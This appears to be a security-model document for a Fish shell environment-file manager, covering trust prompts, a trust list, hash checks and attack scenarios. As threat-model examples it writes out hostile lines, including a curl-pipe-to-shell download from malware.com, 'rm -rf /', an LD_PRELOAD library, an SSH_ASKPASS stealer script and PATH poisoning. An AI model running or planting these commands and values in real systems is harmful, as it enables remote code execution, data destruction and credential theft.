# Project Environment Manager - Security Model

## Security Architecture

### Trust Model Overview

```
┌─────────────────────────────────────────────────────────────┐
│                    Directory Change Event                    │
└─────────────────────────────────────────────────────────────┘
                            ↓
┌─────────────────────────────────────────────────────────────┐
│          Search for .envrc / .env / .project-env            │
└─────────────────────────────────────────────────────────────┘
                            ↓
                    ┌───────┴───────┐
                    │ File Found?   │
                    └───────┬───────┘
                No          │          Yes
                │           ↓
                │   ┌───────────────────────┐
                │   │ Check Trust Status    │
                │   └───────────┬───────────┘
                │               │
                │       ┌───────┴───────┐
                │       │  Is Trusted?  │
                │       └───────┬───────┘
                │               │
                │       Yes     │     No
                │       │       │     │
                │       │       │     ↓
                │       │       │  ┌──────────────────────┐
                │       │       │  │ Show File Contents   │
                │       │       │  └──────────┬───────────┘
                │       │       │             │
                │       │       │             ↓
                │       │       │  ┌──────────────────────┐
                │       │       │  │ Prompt User:         │
                │       │       │  │ y / always / n       │
                │       │       │  └──────────┬───────────┘
                │       │       │             │
                │       │       │     ┌───────┼───────┐
                │       │       │     │       │       │
                │       │       │     y    always     n
                │       │       │     │       │       │
                │       │       │     ↓       ↓       ↓
                │       │       │  [Load]  [Trust   [Skip]
                │       │       │          + Load]
                │       │       │             │
                │       │       │             ↓
                │       │       │  ┌──────────────────────┐
                │       │       │  │ Add to Trusted List  │
                │       │       │  └──────────────────────┘
                │       │       │
                │       ↓       │
                │   ┌───────────┴──────────┐
                │   │  Load Environment    │
                │   └───────────┬──────────┘
                │               │
                │               ↓
                │   ┌──────────────────────┐
                │   │ Auto-Activate:       │
                │   │ - Python venv        │
                │   │ - Node version       │
                │   └──────────────────────┘
                │
                ↓
        ┌───────────────┐
        │  Continue     │
        └───────────────┘
```

## Security Layers

### Layer 1: File Detection

**What it does:**
- Searches for environment files only in current directory
- Does NOT search parent directories (by design)
- Only looks for specific filenames: `.envrc`, `.env`, `.project-env`

**Security benefit:**
- Prevents loading unexpected environment files from parent directories
- User has full control over what files exist in their projects

### Layer 2: Content Preview

**What it does:**
- Shows complete file contents before loading
- Displays in a highlighted box with warning symbol
- User can review every variable before accepting

**Security benefit:**
- No blind loading of variables
- User can spot malicious or unexpected values
- Opportunity to cancel before any execution

**Example:**
```
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
⚠️  Project environment file detected: /path/to/.env
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Contents:
export DATABASE_URL=postgresql://localhost/mydb
export API_KEY=abc123
export RUN_MALWARE=/tmp/bad.sh
                                    ↑ User can spot this!

Load this environment? (y/n/always):
```

### Layer 3: User Consent

**What it does:**
- Requires explicit user action
- Three choices with different security levels:
  - `y` - Load once (session only)
  - `always` - Load and trust permanently
  - `n` - Don't load

**Security benefit:**
- No automatic execution without consent
- User controls trust level
- Can inspect first, trust later

### Layer 4: Trust List

**What it does:**
- Maintains whitelist of trusted directories
- Stored in: `~/.config/fish/trusted_envrc_dirs`
- Plain text file, user can review/edit

**Security benefit:**
- Persistent trust decisions
- User can audit trusted directories
- Can revoke trust with `penv untrust`

**Example trust file:**
```
/Users/davidsamuel.nechifor/projects/safe-project
/Users/davidsamuel.nechifor/work/company-api
/Users/davidsamuel.nechifor/personal/website
```

### Layer 5: Cache Validation

**What it does:**
- Calculates MD5 hash of environment file
- Compares with cached hash
- Re-prompts if file changed (even if directory trusted)

**Security benefit:**
- Detects tampering
- If .env file modified, system notices
- Prevents loading modified untrusted files

**Flow:**
```
Directory trusted ✓
File hash: abc123  (cached)
Current hash: xyz789  (different!)
    ↓
Re-prompt user (file changed)
```

### Layer 6: Sandboxing

**What it does:**
- Only sets environment variables
- Does NOT execute shell commands
- Does NOT source arbitrary scripts

**Security benefit:**
- Limited attack surface
- Can't run `rm -rf /` even if in .env
- Only variable assignment allowed

**Safe:**
```bash
export DATABASE_URL=postgresql://localhost/db
export API_KEY=abc123
```

**Unsafe (won't execute):**
```bash
rm -rf /
curl malware.com/bad.sh | sh
```

## Attack Scenarios & Mitigations

### Scenario 1: Malicious .env in Downloaded Project

**Attack:**
```bash
git clone https://github.com/attacker/bad-project
cd bad-project

# .env contains:
# export PATH=/tmp/malware:$PATH
# export LD_PRELOAD=/tmp/evil.so
```

**Mitigation:**
```
System prompts:
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
⚠️  Project environment file detected: .../bad-project/.env
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Contents:
export PATH=/tmp/malware:$PATH     ← User sees this!
export LD_PRELOAD=/tmp/evil.so     ← Suspicious!

Load this environment? (y/n/always): n
✗ Environment not loaded
```

**Result:** User spots malicious content, declines loading.

### Scenario 2: Modified .env in Trusted Directory

**Attack:**
```bash
# Attacker gains write access to trusted project
cd ~/projects/my-app
# Attacker modifies .env to add:
# export SSH_ASKPASS=/tmp/stealer.sh
```

**Mitigation:**
```
File hash changed: abc123 → xyz789
System re-prompts even though directory trusted:

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
⚠️  Project environment file detected (MODIFIED)
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Contents:
export DATABASE_URL=postgresql://localhost/mydb
export SSH_ASKPASS=/tmp/stealer.sh    ← New suspicious line!

Load this environment? (y/n/always):
```

**Note:** Current implementation doesn't explicitly flag modifications. This is a potential enhancement.

### Scenario 3: PATH Poisoning

**Attack:**
```bash
# .env contains:
export PATH=/tmp/fake-bins:$PATH
# /tmp/fake-bins/git contains malicious code
```

**Mitigation:**
- User sees PATH modification in content preview
- Can decline loading
- If loaded by mistake, can `penv untrust` and reload

**Best practice:**
```bash
# In .env, be explicit about what you're adding
export PROJECT_BINS=$HOME/projects/myapp/bin
export PATH=$PROJECT_BINS:$PATH

# User can verify PROJECT_BINS is safe
```

### Scenario 4: Variable Injection

**Attack:**
```bash
# .env contains:
export DATABASE_URL=postgresql://localhost/db'; DROP TABLE users; --
```

**Mitigation:**
- System only sets variable value
- Application must still sanitize input
- Not a shell injection vulnerability
- Application's responsibility to validate database URLs

**Note:** This system only loads variables. Application-level validation still required.

### Scenario 5: Social Engineering

**Attack:**
```
Attacker: "Hey, clone my project and run it!"
Project .env:
export INSTALL_DEPS=true
export AUTO_UPDATE=true
export TELEMETRY_URL=https://attacker.com/log
```

**Mitigation:**
- User sees all variables before loading
- Can recognize suspicious telemetry
- Can choose not to load
- Can review before trusting

## Trust Management

### Adding Trust

```bash
# Option 1: During first load
cd ~/projects/new-project
# System prompts...
Load this environment? (y/n/always): always
# ✓ Directory trusted

# Option 2: Manual trust
penv trust
# ✓ Directory trusted: /current/path

# Option 3: Edit trust file
echo "/path/to/project" >> ~/.config/fish/trusted_envrc_dirs
```

### Removing Trust

```bash
# Option 1: Current directory
penv untrust
# ✓ Directory untrusted

# Option 2: Edit trust file
# Remove line from ~/.config/fish/trusted_envrc_dirs
```

### Auditing Trust

```bash
# List all trusted directories
penv list

# Review trust file
cat ~/.config/fish/trusted_envrc_dirs

# Check if current directory trusted
penv list | grep (pwd)
```

## Best Practices

### For Users

1. **Review before trusting**
   ```bash
   # Read the .env file first
   cat .env

   # Then decide
   cd ..
   cd project  # Triggers load
   ```

2. **Use specific values**
   ```bash
   # Good: Specific, verifiable
   export DATABASE_URL=postgresql://localhost:5432/mydb

   # Bad: Vague, suspicious
   export AUTO_RUN=true
   export REMOTE_EXEC=enabled
   ```

3. **Audit regularly**
   ```bash
   # Weekly/monthly
   penv list
   # Review each directory
   # Remove unused projects
   ```

4. **Don't trust unknown sources**
   ```bash
   # Downloaded project?
   git clone https://unknown.com/project
   cd project

   # DON'T choose "always"
   # DO review contents carefully
   # DO use "y" (once) first
   ```

### For Project Maintainers

1. **Provide .env.example**
   ```bash
   # Commit .env.example with safe defaults
   export DATABASE_URL=postgresql://localhost/mydb
   export API_KEY=your-key-here
   export DEBUG=true
   ```

2. **Document variables**
   ```bash
   # .env.example with comments
   # Database connection string
   export DATABASE_URL=postgresql://localhost/mydb

   # API key from https://example.com/keys
   export API_KEY=your-key-here

   # Enable debug mode (true/false)
   export DEBUG=true
   ```

3. **Never commit secrets**
   ```bash
   # .gitignore
   .env
   .envrc
   .project-env
   ```

4. **Validate in application**
   ```python
   # Don't trust env vars blindly
   import os
   from urllib.parse import urlparse

   db_url = os.environ.get('DATABASE_URL')
   parsed = urlparse(db_url)

   # Validate
   if parsed.scheme not in ['postgresql', 'mysql']:
       raise ValueError('Invalid database URL')
   ```

## Security Checklist

### Before Loading Environment

- [ ] Do I know the source of this project?
- [ ] Have I reviewed the .env file contents?
- [ ] Are all variables expected and reasonable?
- [ ] Are there any suspicious paths or URLs?
- [ ] Is PATH being modified? Is it safe?
- [ ] Do I trust the project maintainer?

### Before Trusting Directory

- [ ] Have I loaded it once and verified behavior?
- [ ] Is this a long-term project I'll use regularly?
- [ ] Is the .env file in version control (ignored)?
- [ ] Can I review/audit it later?

### Regular Audits

- [ ] Review `penv list` monthly
- [ ] Remove old/unused projects from trust list
- [ ] Check for modified .env files in active projects
- [ ] Verify no unexpected variables are loaded

## Comparison with Other Tools

### vs. direnv

**Project Environment Manager:**
- ✅ Built into Fish shell
- ✅ No external dependencies
- ✅ Simpler trust model
- ✅ Content preview before loading
- ❌ Less flexible (no arbitrary code execution)
- ❌ No .envrc.allow file

**direnv:**
- ✅ More powerful (can execute code)
- ✅ Multi-shell support
- ✅ Mature, well-tested
- ❌ Requires installation
- ❌ More complex
- ❌ Higher security risk (arbitrary execution)

### vs. Manual sourcing

**Project Environment Manager:**
- ✅ Automatic (don't forget to source)
- ✅ Auto-unload when leaving
- ✅ Security prompts
- ✅ Trust management
- ❌ Initial setup

**Manual `source .env`:**
- ✅ Simple, explicit
- ✅ Full control
- ❌ Easy to forget
- ❌ Variables persist after leaving
- ❌ No security checks

## Security Updates

If security vulnerabilities are found:

1. **Update the script**
   ```bash
   # Edit /Users/davidsamuel.nechifor/.config/fish/conf.d/project_env.fish
   # Implement fix
   ```

2. **Reload Fish**
   ```bash
   source ~/.config/fish/config.fish
   ```

3. **Re-audit trusted directories**
   ```bash
   penv list
   # Review each directory
   ```

4. **Test with untrusted directory**
   ```bash
   cd /tmp/test
   echo 'export TEST=value' > .env
   cd ..
   cd test
   # Verify prompt appears
   ```

## Summary

The Project Environment Manager provides:

1. **Defense in Depth**
   - Content preview
   - User consent
   - Trust list
   - Hash validation

2. **User Control**
   - Explicit trust decisions
   - Revocable permissions
   - Audit capabilities

3. **Practical Security**
   - Balances security with convenience
   - Doesn't break workflow
   - Clear, understandable prompts

4. **Limitations**
   - Only loads variables (no execution)
   - Application must validate values
   - User must make good trust decisions

**Remember:** This is a convenience tool with security features, not a security tool with convenience features. Always review what you're loading!
